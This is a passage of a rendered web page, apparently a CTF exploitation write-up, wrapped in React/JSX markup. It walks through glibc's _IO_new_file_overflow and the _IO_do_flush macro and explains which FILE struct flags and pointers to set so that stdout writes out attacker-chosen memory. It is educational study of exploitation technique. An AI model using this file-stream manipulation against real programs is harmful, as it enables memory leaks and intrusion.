\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"FILE \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),\" ch\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_flags \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"&\"}),\" _IO_NO_WRITES\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* SET ERROR */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_flags \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"|=\"}),\" _IO_ERR_SEEN\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token function\",children:\"__set_errno\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"EBADF\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token constant\",children:\"EOF\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* If currently reading or no buffer allocated. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_flags \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"&\"}),\" _IO_CURRENTLY_PUTTING\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"||\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_base \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token constant\",children:\"NULL\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Allocate a buffer if needed. */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_base \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token constant\",children:\"NULL\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_doallocbuf\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_setg\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token comment\",children:`/* Otherwise must be currently reading.\n`})]}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsx)(e.span,{className:\"token comment\",children:`\t If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,\n`})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsx)(e.span,{className:\"token comment\",children:`\t logically slide the buffer forwards one block (by setting the\n`})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsx)(e.span,{className:\"token comment\",children:`\t read pointers to all point at the beginning of the block).  This\n`})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsx)(e.span,{className:\"token comment\",children:`\t makes room for subsequent output.\n`})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsx)(e.span,{className:\"token comment\",children:`\t Otherwise, set the read pointers to _IO_read_end (leaving that\n`})}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"\t alone, so it can continue to correspond to the external position). */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"__glibc_unlikely\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_in_backup\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t  \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"size_t\"}),\" nbackup \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_read_end \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_read_ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t  \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_free_backup_area\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t  f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_read_base \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-=\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"MIN\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"nbackup\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\t\t   f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_read_base \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t  f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_read_ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_read_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_read_ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_buf_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\tf\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_read_end \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_read_ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_buf_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_read_ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_base \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_end \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_buf_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_read_base \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_read_ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_read_end\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_flags \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"|=\"}),\" _IO_CURRENTLY_PUTTING\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_mode \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"<=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"&&\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_flags \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"&\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_IO_LINE_BUF \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"|\"}),\" _IO_UNBUFFERED\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\tf\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_end \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_ptr\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"ch \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token constant\",children:\"EOF\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_do_write\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\t f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_buf_end \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"/* Buffer is really full */\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_do_flush\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token constant\",children:\"EOF\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token constant\",children:\"EOF\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),\"f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_ptr\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"++\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ch\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_flags \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"&\"}),\" _IO_UNBUFFERED\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"||\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_flags \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"&\"}),\" _IO_LINE_BUF\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"&&\"}),\" ch \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token char\",children:\"'\\\\n'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_do_write\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t      f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" f\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token constant\",children:\"EOF\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token constant\",children:\"EOF\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"unsigned\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" ch\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token function\",children:\"libc_hidden_ver\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_IO_new_file_overflow\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" _IO_file_overflow\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Ok! We have some interesting things to manipulate here. The most important thing is we want to reach an \",(0,n.jsx)(e.code,{children:\"_IO_do_write\"}),\" call. This will actually write whats in our buffer to the file descriptor. We obviously can\\u2019t let \",(0,n.jsx)(e.code,{children:\"ch\"}),\" be \",(0,n.jsx)(e.code,{children:\"EOF\"}),\", but our program does print newlines all the time! So how do we reach the second call of \",(0,n.jsx)(e.code,{children:\"_IO_do_write\"}),\"?\"]}),`\n`,(0,n.jsxs)(e.ul,{children:[`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"_IO_NO_WRITES\"}),\" should be false, this prevents the error\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"_IO_CURRENTLY_PUTTING\"}),\" should be true, this skips over unneeded write buffering\"]}),`\n`,(0,n.jsxs)(e.li,{children:[(0,n.jsx)(e.code,{children:\"_IO_write_ptr == _IO_write_end\"}),\", which will call \",(0,n.jsx)(e.code,{children:\"_IO_do_flush\"})]}),`\n`]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Alright, before we can confirm that we hit the newline \",(0,n.jsx)(e.code,{children:\"_IO_do_write\"}),\", we need to look at \",(0,n.jsx)(e.code,{children:\"_IO_do_flush\"}),\":\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[(0,n.jsx)(e.span,{className:\"token directive-hash\",children:\"#\"}),(0,n.jsx)(e.span,{className:\"token directive keyword\",children:\"define\"}),\" \",(0,n.jsx)(e.span,{className:\"token macro-name function\",children:\"_IO_do_flush\"}),(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"  \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_mode \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"<=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),\"\t\t\t\t\t\t\t      \"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"   \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token operator\",children:\"?\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_do_write\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"\t\t\t\t      \"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"\t\t  \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_ptr\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\"\t\t      \"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"   \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token operator\",children:\":\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"_IO_wdo_write\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_wide_data\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_base\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\"\t\t      \"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsx)(e.span,{className:\"code-line\",children:(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"\t\t   \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"_f\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_wide_data\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"->\"}),\"_IO_write_ptr\t\t\t      \"]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"\\\\\"}),`\n`]})}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsxs)(e.span,{className:\"token macro property\",children:[\"\t\t    \",(0,n.jsxs)(e.span,{className:\"token expression\",children:[(0,n.jsx)(e.span,{className:\"token 